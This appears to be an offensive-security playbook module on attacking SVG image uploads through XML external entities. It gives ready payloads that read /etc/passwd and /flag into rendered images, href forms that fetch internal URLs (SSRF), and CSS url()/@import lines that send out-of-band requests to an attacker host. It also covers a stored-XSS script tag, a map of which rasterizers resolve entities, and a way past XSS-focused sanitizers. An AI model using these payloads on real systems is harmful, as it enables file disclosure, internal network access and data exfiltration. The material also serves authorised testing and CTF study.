# SVG XXE — the upload surface

## Why SVG — it IS XML

SVG is an XML document — any "upload an image" endpoint that accepts
`.svg` routes your bytes into an XML parser (then a rasterizer). The
upload handler thinks "image", the parser sees markup.

## The minimal payload — file-read into a `<text>`

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20" font-size="16">&x;</text>
</svg>
```

If the app renders the SVG to PNG/thumbnail and serves it back — the
file content is *drawn into the image* → in-band exfil through the
rendered image (OCR or the app's own preview text).

## The `<image>`-href form — SSRF + file embedding

```xml
<image href="file:///flag" x="0" y="0" height="100" width="100"/>
<image href="http://internal/admin" .../>
<use href="file:///flag#x"/>
```

`xlink:href`/`href` in `<image>`/`<use>`/`<feImage>` — the rasterizer
fetches the resource — SSRF primitive inside a file format.

## The CSS/`@import`/`url()` trick — CSS-fetch inside SVG

```xml
<style>
  text { fill: url(http://YOU/leak) }
</style>
<style>@import url(http://YOU/x);</style>
<image style="fill:url(http://YOU/x)" .../>
```

Rasterizers that honor CSS `url()` fetch — a blind-OOB channel.

## The script-element — SVG's JS — usually not server-side

`<script>alert(1)</script>` — stored-XSS surface when the SVG is served
with `Content-Type: image/svg+xml` and viewed — NOT XXE — but an
important second-order finding: an "uploads an SVG" app that serves it
as `image/svg+xml` gives stored XSS — route to `web-xss`.

## The DOCTYPE-preserved SVG — full XXE inside

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY x SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
```

The rasterizer's XML parser expands `&x;` → file content lands in the
rendered text.

## Where the render output lands — the channel

- thumbnail/preview image served back → OCR/read the image
- a "converted PNG" download → the text is drawn in the PNG
- the raw SVG re-served → `view-source` shows the substituted entity
- an error page naming the substituted entity → error channel
- nothing visible → blind: `xlink:href`/`@import` OOB fetch

## The rasterizer parser map — which lib decides

| Rasterizer | Parser | XXE |
|---|---|---|
| librsvg (common) | libxml2 | often resolves entities |
| Batik (Java) | Xerces | external entities yes |
| Inkscape CLI | libxml2 | yes |
| resvg/cairosvg | varies | varies |
| ImageMagick `convert` | libxml2 | yes — plus IM's own coders |

Check the app's stack hints — `Server:` header, exposed `composer.json`
/`requirements.txt`, error traces.

## The "sanitizer" hurdle — SVGO/DOMPurify-style cleaning

Apps may run SVGO/DOMPurify to strip scripts — those typically strip
`<script>`/events but LEAVE `<!DOCTYPE>` and entities intact — the
XXE survives sanitization that was built for XSS.

## The polyglot SVG — XML + raster-in-one

A file that parses as both a valid raster format AND XML — rare for
SVG (it's pure XML) — polyglots matter more for PNG/GIF-in-XML
wrappers — see `web-file-upload`'s `polyglot-*` modules.

## Falsifiers

- the upload rejects non-raster or SVG gets sanitized so DOCTYPE is
  stripped → XXE path dead; stored-XSS may still live

## Output to record

- the verbatim file content rendered into the image/preview, or the
  OOB hit + which SVG element carried the entity/href
